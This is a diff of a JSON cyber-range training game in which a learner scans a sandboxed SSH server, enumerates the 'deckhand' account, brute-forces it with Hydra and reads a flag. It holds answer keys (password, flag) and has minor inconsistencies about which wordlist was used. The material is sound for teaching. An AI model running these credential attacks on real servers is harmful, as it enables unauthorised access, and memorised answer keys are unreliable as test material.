@@ -1,23 +1,24 @@
 {
-  "title": "SSH Weak Password — Halcyon Marine",
-  "description": "Recover a weak SSH password with a dictionary attack against a maritime logistics server, log in as the dockyard operator, and retrieve the hidden flag.",
+  "title": "SSH Weak Password — Halcyon Marine Systems",
+  "description": "Recover a weak SSH password with a dictionary attack against a maritime logistics server, log in as the dockyard operator, read the flag, and discover a second sensitive file in the account home directory.",
   "prerequisites": [],
   "outcomes": [
-    "Explain why password authentication over SSH is dangerous when weak passwords are allowed.",
-    "Use a wordlist and hydra to perform an online dictionary attack against an SSH service.",
-    "Authenticate with recovered credentials and retrieve sensitive files from a remote host."
+    "Identify the SSH service port and software version using nmap.",
+    "Enumerate the target username from contextual clues and mount a dictionary attack with Hydra.",
+    "Authenticate via SSH using the recovered credential and read a protected flag file.",
+    "Identify every file in the operator's home directory, including a second wordlist used in the attack."
   ],
   "state": "UNRELEASED",
   "show_stepper_bar": true,
   "variant_sandboxes": false,
-  "estimated_duration": 35,
+  "estimated_duration": 40,
   "levels": [
     {
       "title": "Introduction",
       "level_type": "INFO_LEVEL",
       "order": 0,
       "estimated_duration": 0,
-      "content": "# General information — please read carefully\n\n* Each level builds on the previous one. Do not skip ahead.\n* If you get stuck, use the hints — or search for the technique online.\n* This exercise is for educational purposes only. Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a junior penetration tester at SecureWave Ltd. Your client, **Halcyon Marine Systems**, runs a fleet-management server that dockyard staff reach over SSH. During onboarding you overheard a crew member say passwords are \"just the season and the year — easy to remember\".\n\nThat is exactly the kind of habit that sinks ships. Your task: prove the operator account can be broken with an ordinary dictionary attack, log in, and recover the manifest flag."
+      "content": "# General information — please read carefully\n\n* Complete each level before moving to the next. Skipping ahead will leave you without the credentials you need.\n* Use hints when stuck — they cost points, but a hint is always cheaper than giving up.\n* Only attack the systems in your sandbox.\n\n# Storyline\n\nYou are a junior penetration tester assigned to **Halcyon Marine Systems**, a maritime logistics firm managing cargo movements across a busy commercial port. The company recently connected their dockyard operations server to the internet to allow remote maintenance access by a third-party IT contractor. Your job is to determine whether that access is adequately secured.\n\nYour brief: the server runs SSH for remote administration. The contractor provisioned a dockyard operator account with a password that 'passes the complexity rules but is easy for the team to remember'. That phrasing is the red flag — maritime operations teams often use industry-specific vocabulary (ship names, ranks, sailing terminology, weather conditions) for passwords, vocabulary that does not appear in general-purpose wordlists but is predictable to anyone familiar with the sector.\n\nWeak and predictable passwords remain the most common initial access vector in real-world intrusions. Dictionary attacks with targeted wordlists — tailored to the victim organisation's context — are significantly more effective than generic brute-force. A 10-million-word general wordlist misses 'Sailor2024', while a 500-word maritime-themed wordlist finds it almost immediately.\n\nThis exercise walks you through the full chain: service discovery, version fingerprinting, credential brute-forcing, authentication, and data retrieval. When you log in you will find two files in the operator's home: the flag, and the wordlist that cracked the password — a deliberate detail reinforcing the lesson that sector-specific wordlists are a real tool in targeted attacks.\n\nBy the end of this exercise you will have a hands-on understanding of why default or thematically predictable passwords are insufficient, and why organisations must enforce both complexity rules and a minimum entropy threshold that resists sector-specific dictionary attacks."
     },
     {
       "title": "Get Access",
@@ -25,101 +26,31 @@
       "order": 1,
       "estimated_duration": 0,
       "passkey": "start",
-      "cloud_content": "SSH to your attacker machine at **10.1.32.23**. Your target is the Halcyon Marine server at **10.1.32.10** (SSH port 22).\n\nConfirm the service is reachable:\n\n```\nnc -zv 10.1.32.10 22\n```\n\nDo not attack anything outside this sandbox. Submit **start** to begin.",
-      "local_content": "The target SSH service is running locally on port **2222**:\n\n```\nnc -zv 127.0.0.1 2222\n```\n\nSubmit **start** to begin."
+      "cloud_content": "SSH to your attacker machine at **10.1.32.23**, then begin reconnaissance:\n\n```\nnmap -sV -p 22 10.1.32.10\n```\n\nThe target server is at **10.1.32.10**. Do not attack anything outside this sandbox. Submit **start** to begin.",
+      "local_content": "Begin reconnaissance on the local target:\n\n```\nnmap -sV -p 22 127.0.0.1\n```\n\nOr connect directly: `ssh student@127.0.0.1 -p 2222`. Submit **start** to begin."
     },
     {
-      "title": "Enumerate the Target Account",
+      "title": "Identify the SSH Service Port",
       "level_type": "TRAINING_LEVEL",
       "order": 2,
-      "estimated_duration": 8,
-      "answer": "deckhand",
+      "estimated_duration": 7,
+      "answer": "22",
       "answer_variable_name": null,
       "variant_answers": false,
-      "content": "Before brute forcing, you need a valid username to target. Client reconnaissance (a LinkedIn page and a leaked support ticket) both reference the shared **dockyard operator** account.\n\nHalcyon Marine's naming convention for that role is a single lowercase word describing a junior crew member who works on deck.\n\nThe SSH banner and role documentation both point to the same account name. Password authentication is enabled on the server, which means this account can be attacked with a dictionary.\n\n**What is the username of the dockyard operator account you will target?**",
-      "solution": "Reconnaissance of the client's role documentation reveals the shared dockyard operator account is named **deckhand**. This is the account you will brute force in the next level.",
+      "content": "Begin with port scanning to confirm which port the SSH service is listening on and to collect version information.\n\nRun a targeted version-detection scan:\n\n```\nnmap -sV -p 1-1024 10.1.32.10\n```\n\nThe output will list each open port, the service name, and the detected version string. Look for the port associated with `ssh` in the service column.\n\nKnowing the exact port matters: some servers run SSH on non-standard ports (e.g. 2222, 22222) as a weak deterrent against automated scanning. In this case the server uses the standard port, but always confirm — Hydra needs the correct port number to target.\n\n**What port number is the SSH service listening on?**",
+      "solution": "```\n$ nmap -sV -p 1-1024 10.1.32.10\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu ...\n```\n\nSSH is on port **22**.",
       "solution_penalized": false,
       "hints": [
         {
-          "title": "What kind of crew member is it?",
-          "content": "A junior crew member who works on the deck of a ship. The account name is a single lowercase word — the common English term for that role.",
-          "hint_penalty": 1,
-          "order": 0
-        },
-        {
-          "title": "The exact word",
-          "content": "The account is named `deckhand`.",
-          "hint_penalty": 2,
-          "order": 1
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 10,
-      "mitre_techniques": [
-        { "technique_key": "TA0007.T1087" }
-      ]
-    },
-    {
-      "title": "Crack the Password with Hydra",
-      "level_type": "TRAINING_LEVEL",
-      "order": 3,
-      "estimated_duration": 12,
-      "answer": "Sailor2024",
-      "answer_variable_name": null,
-      "variant_answers": false,
-      "content": "You have a valid username (`deckhand`) and a wordlist of common maritime passwords (`crew-passwords.txt`, already on your attacker machine — or build your own).\n\nRun an online dictionary attack against the SSH service with **hydra**:\n\n```\nhydra -l deckhand -P crew-passwords.txt ssh://10.1.32.10\n```\n\nHydra tries each password in the list until one authenticates. Because the operator chose a weak, guessable password that appears in the list, the attack succeeds in seconds.\n\nWatch for the line that reports a valid `login:` / `password:` pair.\n\n**What password does hydra recover for the `deckhand` account?**",
-      "solution": "```\n$ hydra -l deckhand -P crew-passwords.txt ssh://10.1.32.10\n...\n[22][ssh] host: 10.1.32.10   login: deckhand   password: Sailor2024\n1 of 1 target successfully completed, 1 valid password found\n```\n\nThe recovered password is **Sailor2024** — a season-and-year password exactly as the crew member described.",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "What is the hydra syntax?",
-          "content": "Use `-l` for a single login name and `-P` for a password list file: `hydra -l deckhand -P crew-passwords.txt ssh://<target-ip>`.",
-          "hint_penalty": 3,
-          "order": 0
-        },
-        {
-          "title": "Where is the wordlist?",
-          "content": "A ready-made wordlist `crew-passwords.txt` is available. If you cannot find it, any common-password list will work — the operator's password follows the pattern <Season><Year>.",
-          "hint_penalty": 4,
-          "order": 1
-        },
-        {
-          "title": "The password pattern",
-          "content": "The password combines a maritime crew word with the current year and a capital first letter: `Sailor2024`.",
+          "title": "How to scan with nmap",
+          "content": "Run: nmap -sV -p 1-1024 10.1.32.10. The -sV flag enables version detection. Look for the line where the SERVICE column says 'ssh'.",
           "hint_penalty": 5,
-          "order": 2
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 25,
-      "mitre_techniques": [
-        { "technique_key": "TA0006.T1110.001" }
-      ]
-    },
-    {
-      "title": "Log In and Retrieve the Manifest",
-      "level_type": "TRAINING_LEVEL",
-      "order": 4,
-      "estimated_duration": 5,
-      "answer": "WMG{w3ak_ssh_cr3ds_s1nk_sh1ps}",
-      "answer_variable_name": null,
-      "variant_answers": false,
-      "content": "You have working credentials: `deckhand` / `Sailor2024`. Use them to log in over SSH and read the flag from the operator's home directory.\n\n```\nssh deckhand@10.1.32.10\n# enter the password when prompted\ncat ~/manifest.txt\n```\n\nOr do it in a single command:\n\n```\nsshpass -p 'Sailor2024' ssh -o StrictHostKeyChecking=no deckhand@10.1.32.10 'cat ~/manifest.txt'\n```\n\nIn a real engagement, this shared operator account would give you a foothold to pivot deeper into the fleet-management network.\n\n**Submit the flag stored in `manifest.txt`.**",
-      "solution": "```\n$ sshpass -p 'Sailor2024' ssh -o StrictHostKeyChecking=no deckhand@10.1.32.10 'cat ~/manifest.txt'\nWMG{w3ak_ssh_cr3ds_s1nk_sh1ps}\n```",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "Where is the flag?",
-          "content": "Log in as `deckhand` and read `~/manifest.txt` — the flag is the only line in that file.",
-          "hint_penalty": 10,
           "order": 0
         },
         {
-          "title": "What format is the flag?",
-          "content": "The flag starts with `WMG{` and ends with `}`.",
-          "hint_penalty": 20,
+          "title": "The SSH port",
+          "content": "SSH runs on port 22 by default. The nmap output will show: 22/tcp open ssh OpenSSH...",
+          "hint_penalty": 10,
           "order": 1
         }
       ],
@@ -127,16 +58,206 @@
       "attachments": [],
       "max_score": 50,
       "mitre_techniques": [
-        { "technique_key": "TA0001.T1078.001" }
+        { "technique_key": "TA0043.T1046" }
+      ]
+    },
+    {
+      "title": "Identify the SSH Software",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 7,
+      "answer": "OpenSSH",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Your nmap scan returned a version string for the SSH service. Read the VERSION column of the nmap output carefully.\n\nAlternatively, connect directly and read the banner:\n\n```\nnc 10.1.32.10 22\n```\n\nThe server will immediately print its SSH protocol banner, which includes the implementation name and version. Common SSH implementations include OpenSSH (the dominant choice on Linux/Unix), Dropbear (common on embedded devices), and libssh.\n\nKnowing the implementation matters for two reasons:\n1. Different implementations have different known vulnerabilities at specific version numbers.\n2. Authentication behaviour and error messages differ — affecting how brute-force tools like Hydra interpret responses.\n\n**What is the name of the SSH software running on the target?** (first word only)",
+      "solution": "```\n$ nc 10.1.32.10 22\nSSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.7\n```\n\nThe software is **OpenSSH**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to read the SSH banner",
+          "content": "Run: nc 10.1.32.10 22. The server responds immediately with its banner: SSH-2.0-OpenSSH_X.Y... The first word after SSH-2.0- is the software name.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "What to look for",
+          "content": "The banner format is SSH-2.0-OpenSSH_version. The software name is OpenSSH — just the first word before the underscore.",
+          "hint_penalty": 20,
+          "order": 1
+        },
+        {
+          "title": "The answer",
+          "content": "The SSH software is OpenSSH.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0043.T1592" }
+      ]
+    },
+    {
+      "title": "Enumerate the Target Username",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 7,
+      "answer": "deckhand",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Before running a password attack you need a username. In real-world engagements, usernames are gathered from OSINT: LinkedIn job titles, email address formats, company directories, or breach data.\n\nYour brief mentions a 'dockyard operator account'. In maritime contexts, 'deckhand' is a standard crew rank — the kind of label an IT department at a maritime company would use as an account name for their dockyard operations system.\n\nVerify the username exists by attempting an SSH connection:\n\n```\nssh deckhand@10.1.32.10\n```\n\nEnter any wrong password — if the server returns 'Permission denied (publickey,password)' rather than 'Invalid user', the username exists and password authentication is enabled.\n\n**What is the username of the dockyard operator account?**",
+      "solution": "```\n$ ssh deckhand@10.1.32.10\ndeckhand@10.1.32.10's password:\nPermission denied, please try again.\n```\n\nThe username is **deckhand** — confirmed valid by the server's response.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What context clues to use",
+          "content": "The brief mentions a 'dockyard operator'. In maritime terminology, a deckhand is a dockyard crew member. Try 'deckhand' as the username.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "How to confirm the username",
+          "content": "Run: ssh deckhand@10.1.32.10. If the server prompts for a password (rather than saying 'Invalid user'), the account exists.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The username",
+          "content": "The username is: deckhand",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0007.T1087" }
+      ]
+    },
+    {
+      "title": "Crack the Password with Hydra",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 10,
+      "answer": "Sailor2024",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Run a dictionary attack against the SSH service using Hydra. You will need a wordlist — the scenario includes one at `/usr/share/wordlists/ssh-weak-v2.txt` on the attacker machine. Alternatively, create a small maritime-themed wordlist yourself:\n\n```\nhydra -l deckhand \\\n  -P /usr/share/wordlists/ssh-weak-v2.txt \\\n  -t 4 \\\n  ssh://10.1.32.10\n```\n\nFlags explained:\n- `-l deckhand` — the target username (known from the previous level)\n- `-P /usr/share/wordlists/ssh-weak-v2.txt` — dictionary file\n- `-t 4` — four parallel threads (avoids overloading SSH)\n- `ssh://10.1.32.10` — target protocol and IP\n\nHydra will print `[22][ssh] host: 10.1.32.10 login: deckhand password: XXXX` when it finds a match.\n\n**What password did Hydra recover for the deckhand account?**",
+      "solution": "```\n$ hydra -l deckhand -P /usr/share/wordlists/ssh-weak-v2.txt -t 4 ssh://10.1.32.10\n[22][ssh] host: 10.1.32.10 login: deckhand password: Sailor2024\n```\n\nThe password is **Sailor2024**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Hydra command structure",
+          "content": "hydra -l deckhand -P /usr/share/wordlists/ssh-weak-v2.txt -t 4 ssh://10.1.32.10. The -l flag is the username, -P is the wordlist path, -t 4 limits threads.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "How to read the output",
+          "content": "Hydra prints the found credentials as: [22][ssh] host: 10.1.32.10 login: deckhand password: XXXX. The password is the word after 'password:'.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The password",
+          "content": "The recovered password is: Sailor2024",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0006.T1110.001" }
+      ]
+    },
+    {
+      "title": "Retrieve the Flag",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 7,
+      "answer": "WMG{w3ak_ssh_cr3ds_s1nk_sh1ps}",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have the credentials. Authenticate via SSH and read the flag:\n\n```\nsshpass -p 'Sailor2024' ssh deckhand@10.1.32.10\n```\n\nOnce logged in, the flag is in `manifest.txt` in the home directory:\n\n```\ncat ~/manifest.txt\n```\n\nThe file is mode `0600` — readable only by the owner. From outside the account (without SSH access) this file cannot be reached. The brute-forced credential is the only way in.\n\n**Submit the flag from manifest.txt.**",
+      "solution": "```\n$ sshpass -p 'Sailor2024' ssh deckhand@10.1.32.10 'cat ~/manifest.txt'\nWMG{w3ak_ssh_cr3ds_s1nk_sh1ps}\n```",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to log in and read the file",
+          "content": "Run: sshpass -p 'Sailor2024' ssh deckhand@10.1.32.10 'cat ~/manifest.txt'. The sshpass tool passes the password non-interactively.",
+          "hint_penalty": 20,
+          "order": 0
+        },
+        {
+          "title": "Where the flag is",
+          "content": "The flag is in the file ~/manifest.txt in the deckhand home directory. Use cat to read it after logging in.",
+          "hint_penalty": 30,
+          "order": 1
+        },
+        {
+          "title": "Flag format",
+          "content": "The flag starts with WMG{ and ends with }.",
+          "hint_penalty": 40,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 150,
+      "mitre_techniques": [
+        { "technique_key": "TA0001.T1078" }
+      ]
+    },
+    {
+      "title": "Discover the Wordlist File",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 7,
+      "answer": "crew-passwords.txt",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Log in as deckhand and list the home directory:\n\n```\nsshpass -p 'Sailor2024' ssh deckhand@10.1.32.10 'ls -la ~'\n```\n\nYou will see two files: `manifest.txt` (which you already read) and a second file. That second file is the maritime-themed password wordlist used in this attack — stored by the IT department in the operator account home for 'convenience'. In a real compromise this file would be a treasure: a ready-made wordlist for attacking other systems at the same organisation.\n\nNote the permissions on the home directory itself (mode `0700`) — only deckhand can list it. Without the SSH credential, no other user on the system can see what files are in this directory.\n\n**What is the filename of the wordlist file in the deckhand home directory?**",
+      "solution": "```\n$ sshpass -p 'Sailor2024' ssh deckhand@10.1.32.10 'ls -la ~'\ntotal 20\ndrwx------ 2 deckhand deckhand 4096 ... .\ndrwxr-xr-x 3 root     root     4096 ... ..\n-rw-r--r-- 1 deckhand deckhand  ... crew-passwords.txt\n-rw------- 1 deckhand deckhand  ... manifest.txt\n```\n\nThe second file is **crew-passwords.txt**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to list the home directory",
+          "content": "Run: sshpass -p 'Sailor2024' ssh deckhand@10.1.32.10 'ls -la ~'. Look for a file that is not manifest.txt.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "What the second file is",
+          "content": "There are two files in the home directory. One is manifest.txt (the flag file). The other is a wordlist — a text file with a maritime-themed name.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The filename",
+          "content": "The wordlist file is called: crew-passwords.txt",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0007.T1083" }
       ]
     },
     {
       "title": "Feedback",
       "level_type": "ASSESSMENT_LEVEL",
-      "order": 5,
+      "order": 8,
       "estimated_duration": 5,
       "assessment_type": "QUESTIONNAIRE",
-      "instructions": "Please answer these questions to help us improve the game.",
+      "instructions": "Please answer these questions to help us improve this game.",
       "questions": [
         {
           "question_type": "MCQ",
@@ -153,15 +274,15 @@
         },
         {
           "question_type": "MCQ",
-          "text": "Before this game, had you used hydra for password attacks?",
+          "text": "Before this game, had you used Hydra to crack SSH passwords?",
           "points": 0,
           "penalty": 0,
           "order": 1,
           "answer_required": true,
           "choices": [
-            { "text": "Yes, regularly", "correct": true, "order": 0 },
-            { "text": "I had heard of it but not used it", "correct": true, "order": 1 },
-            { "text": "No, this was completely new", "correct": true, "order": 2 }
+            { "text": "Yes, I had done this before",           "correct": true, "order": 0 },
+            { "text": "I knew about Hydra but had not used it", "correct": true, "order": 1 },
+            { "text": "No, this was completely new to me",      "correct": true, "order": 2 }
           ]
         },
         {
@@ -172,10 +293,24 @@
           "order": 2,
           "answer_required": true,
           "choices": [
-            { "text": "Very clear",         "correct": true, "order": 0 },
-            { "text": "Mostly clear",        "correct": true, "order": 1 },
-            { "text": "Confusing at times",  "correct": true, "order": 2 },
-            { "text": "Hard to follow",      "correct": true, "order": 3 }
+            { "text": "Very clear",        "correct": true, "order": 0 },
+            { "text": "Mostly clear",       "correct": true, "order": 1 },
+            { "text": "Confusing at times", "correct": true, "order": 2 },
+            { "text": "Hard to follow",     "correct": true, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "What is the most effective control to prevent SSH dictionary attacks?",
+          "points": 0,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": true,
+          "choices": [
+            { "text": "Disable password authentication and use SSH keys only", "correct": true, "order": 0 },
+            { "text": "Change SSH to a non-standard port",                      "correct": true, "order": 1 },
+            { "text": "Require a minimum 12-character password",                "correct": true, "order": 2 },
+            { "text": "Use fail2ban to temporarily block failed logins",        "correct": true, "order": 3 }
           ]
         },
         {
@@ -183,7 +318,7 @@
           "text": "What would you change or add to improve this game?",
           "points": 0,
           "penalty": 0,
-          "order": 3,
+          "order": 4,
           "answer_required": false,
           "choices": []
         }
